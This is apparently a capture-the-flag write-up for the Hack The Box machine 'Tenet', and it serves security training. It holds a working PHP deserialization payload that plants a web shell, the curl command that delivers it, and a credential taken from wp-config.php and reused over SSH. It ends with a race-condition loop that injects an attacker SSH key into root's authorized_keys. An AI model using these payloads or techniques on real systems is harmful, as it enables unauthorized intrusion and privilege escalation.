# initial access
write host file and visit tenet.htb web page

![](1.png)
he said that the website was in the process of migration.
and have a file call 'sator.php' (backup)
 
```bash
curl http://$target_ip/sator.php.bak
```

the php code given below allow us to control the 'arepo' parameter and unserialize it
```php
<?php

class DatabaseExport
{
	public $user_file = 'users.txt';
	public $data = '';

	public function update_db()
	{
		echo '[+] Grabbing users from text file <br>';
		$this-> data = 'Success';
	}


	public function __destruct()
	{
		file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
		echo '[] Database updated <br>';
	//	echo 'Gotta get this working properly...';
	}
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();

?>
```
Basically, this code means that we can control the 'data' parameter and write into some file.So, let's us create a evil class and then replace the 'data' and 'user_file' parameter.
```php
<?php

class DatabaseExport
{
	public $user_file = 'shell.php';
	public $data = '<?php system($_REQUEST["cmd"]); ?>';
}

$evil_Stream = new DatabaseExport;
echo serialize($evil_Stream);
?>
```

```bash
λ  Tenet main ✗ payload=$(php ./poc.php )
λ  Tenet main ✗ url_encode_payload=$(~/tool/url.sh "$payload")
λ  Tenet main ✗ curl "10.129.109.204/sator.php?arepo=$url_encode_payload" -v 
```

and last, send our payload with curl command
we have rce on target :D
![[Pasted image 20230921204943.png]]
we can write a simple revshell bash code and url encode it
![[Pasted image 20230921205220.png]]
![[Pasted image 20230921205253.png]]

# shell as neil
we can found neil cred on wordpress config file (wp-config.php) 
![[Pasted image 20230921205436.png]]
```bash
# neil:Opera2112
ssh neil@$target
```

# shell as root
![[Pasted image 20230921205748.png]]
we can use sudo command with enableSSH.sh script
```bash
#!/bin/bash

checkAdded() {

	sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)

	if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then

		/bin/echo "Successfully added $sshName to authorized_keys file!"

	else

		/bin/echo "Error in adding $sshName to authorized_keys file!"

	fi

}

checkFile() {
	if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then

		/bin/echo "Error in creating key file!"

		if [[ -f $1 ]]; then /bin/rm $1; fi

		exit 1

	fi

}

addKey() {

	tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

	(umask 110; touch $tmpName)

	/bin/echo $key >>$tmpName

	checkFile $tmpName

	/bin/cat $tmpName >>/root/.ssh/authorized_keys

	/bin/rm $tmpName

}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded
```
basically, he created a temporary file name, then wrote the key to the '/root/.ssh/authorized_keys' 
This is a classic race condition. we can write the key before this script.

```bash
while true; do for fn in /tmp/ssh-*; do echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRDyP0boak96SlSEeZr0IgcgpFnrkxHIYaeTkuWSW1rYsyVKuoo4idtuIhmHtmlDNKhQS1GwP1iAQRRH8y3EmtIUH3ofvl9qUrdCtP8g2aHtzPGSgj+jB+rzYozNqJI/SzQnBiC5/GrdBDnC+3GqgT/bp20yPhzV4vSuf+07NK9CZni86TPGKLHI6vcbRoPIei13IPQla0cRL8/y72iv14nHcRzntR2fhNC8MClTSBDzXNBratsWyLVfVvgp+KJznxqMJ+k2JpmHCk9eSTblG7x7xzwBa9LVlMsLmlywwjeBHpXgGuBVSA8ZZxNoXTv/thm56/pTR5ZJk8GCS+PT/SF5BT/387/uZ3latWs1G7qlJ78pX2iftEGWgZctVaUc85YgRi9t+XWSVxZKviPe5SARqE3QpL7RbRagl0JXCH+n3A1g8iUWoQ2F92uT4bk7xGovLLjCkS6LJ0StLAE1Egq6ysol5SPYN4Iu3OJMbaI4TePt3Ebe7IumfBL0VxL2s= sh4n4c1@hh" > $fn; done; done
```
![[Pasted image 20230921210815.png]]

# wrap up

simple poc python code to get initial acces
![[Pasted image 20230921213619.png]]

